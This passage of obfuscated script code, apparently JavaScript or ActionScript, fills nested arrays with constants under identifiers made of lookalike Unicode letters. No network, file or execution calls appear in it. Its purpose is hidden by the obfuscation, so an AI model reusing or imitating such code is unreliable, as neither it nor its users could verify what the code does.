			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆᐃΔⲆᐃΔ;
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆΔⵠΔᐃᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠⵠⲆ] = ⲆΔ.ΔΔⵠᐃⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆᐃΔ] = ⲆΔ.ᐃᐃⲆⵠⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠᐃⲆΔⲆⲆⲆ] = ⲆΔ.ⵠᐃⲆΔⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⲆΔΔᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔΔⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠⲆΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠᐃⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔΔΔᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃᐃΔΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔᐃΔᐃᐃΔ;
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠⲆΔⵠⵠΔ;
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠᐃⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆΔᐃΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔⲆⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆΔⲆⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃΔⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆᐃⲆΔΔⵠ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃⲆⵠⲆΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆⵠⲆΔΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔΔⲆⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⵠⲆᐃΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⵠⵠᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠⵠⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃⲆᐃⵠⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔΔⲆᐃⵠΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔᐃΔΔᐃⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃΔᐃⲆⵠⵠⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⵠΔⲆΔΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⵠⵠΔⵠⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠΔⲆΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⵠᐃᐃⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃⲆⵠⵠᐃⲆΔΔ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⲆⲆⲆⵠΔΔᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆᐃᐃΔΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃⵠΔΔΔΔᐃⵠ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆⲆⵠᐃᐃᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆΔⵠⵠⲆΔΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃⵠⵠᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃΔΔᐃᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔᐃΔⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆⲆΔᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⲆᐃⵠⵠⵠΔΔΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆⲆΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃΔΔⵠΔⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠᐃⵠᐃΔᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ΔᐃⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆⵠΔⲆᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠⵠᐃΔⵠΔⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔᐃᐃⵠΔⵠΔⲆ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠΔⲆᐃᐃᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⵠᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⵠᐃⵠΔⲆⵠᐃⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃᐃᐃⲆΔⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⲆⵠⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆΔⲆⵠᐃΔΔΔ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⲆⵠΔΔΔⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠᐃΔⵠᐃⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆⵠΔⲆΔΔ;
			ⵠⲆ[Ⲇ.ΔᐃΔΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃᐃΔΔΔᐃ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠⲆᐃᐃⵠᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠᐃΔⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠⲆⲆΔΔᐃⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⲆᐃᐃⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⲆΔⵠΔⲆΔ;
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔΔⲆΔⵠΔⲆ;
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆΔⲆⲆᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃⵠΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ΔⵠⲆⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔᐃⵠⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆᐃᐃⲆΔⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠΔⲆⲆⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆᐃᐃᐃΔⲆ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃᐃΔΔⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃᐃΔⲆᐃᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃⲆⲆⲆΔΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠᐃΔⵠⲆⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔΔⵠᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃᐃᐃᐃⲆΔⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔΔΔⲆΔΔΔⵠ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆΔⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃⵠΔΔᐃⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃⵠΔⲆΔⲆⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠΔΔⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔᐃᐃⵠⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠΔᐃΔⲆⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔΔⵠᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃᐃΔᐃΔⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⲆΔⵠᐃⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠⲆᐃⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⲆⲆΔᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃᐃΔΔΔⵠΔ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔⲆⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔⵠᐃᐃΔⵠ;
			ⵠⲆ[Ⲇ.ΔⵠⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⵠⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔⵠᐃᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ΔⵠⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃⵠΔⲆⵠΔ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⲆᐃⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠΔⲆΔΔⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⵠⵠᐃⵠΔⵠⵠᐃ);
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⵠΔⵠⲆⵠⲆⵠⵠ);
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⵠΔⵠⲆⵠⲆⵠⵠ);
			ⵠⲆ[Ⲇ.ΔⲆᐃΔⵠΔΔ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⲆⵠⵠⵠΔᐃᐃΔ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⵠΔᐃΔⵠᐃ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆⵠⵠⲆΔⲆᐃ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔΔⵠⵠⵠⵠᐃ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⲆᐃᐃΔⵠΔ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆΔΔΔⵠΔΔ);
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⲆΔⲆΔᐃⲆ);
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⵠⲆⲆⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃΔⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆⲆΔⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆᐃⵠᐃΔᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔᐃⵠΔᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠᐃⵠᐃΔᐃΔ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃΔⲆᐃⵠⲆΔ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⵠⲆΔⵠⵠⵠ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⵠΔᐃⵠΔⵠ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⲆⲆᐃⵠⲆᐃ);
			ⵠⲆ[Ⲇ.ⵠⲆⲆᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃᐃⵠᐃⲆⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠⵠΔⵠᐃⲆΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔⲆⲆΔⲆⵠⵠ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⵠᐃⲆᐃᐃΔⲆ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆΔⵠᐃΔⵠΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠΔⵠⲆᐃⲆΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⲆᐃⵠΔᐃΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⲆⲆΔᐃᐃᐃ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⲆᐃᐃΔᐃⵠ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔΔᐃⵠⲆᐃⲆ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃᐃⵠᐃᐃⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔⵠΔΔⵠⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃᐃᐃᐃⲆⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⵠⵠΔΔⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ΔⲆⵠⵠΔⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ΔⲆⵠΔⲆΔΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃᐃⵠΔΔΔΔ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⵠⲆⵠⵠᐃⵠ);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆⲆⵠᐃⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃᐃΔΔᐃΔⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆᐃᐃΔΔΔΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃΔⵠⲆΔΔΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆΔΔᐃⲆΔⵠ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔⵠⲆᐃΔⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆⵠⲆⵠⵠⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ΔⵠⲆⲆⵠⲆᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃΔⵠⵠⲆΔΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⵠⲆⵠᐃⲆⵠ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠΔⲆⲆⵠᐃᐃ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠⲆⲆⲆⲆΔΔ);
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔⵠ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠΔΔᐃⵠⲆᐃ);
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔⲆᐃⲆᐃ;
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⵠⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⲆⲆⵠᐃⵠΔ;
			ⵠⲆ[Ⲇ.ⵠᐃⵠⲆⵠⵠΔ] = ⲆΔ.ⵠΔᐃⲆΔⵠᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆᐃᐃⲆⲆⲆⲆⲆ;
			ⵠⲆ[Ⲇ.ΔΔⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆᐃⲆⵠᐃⵠⲆᐃᐃ;
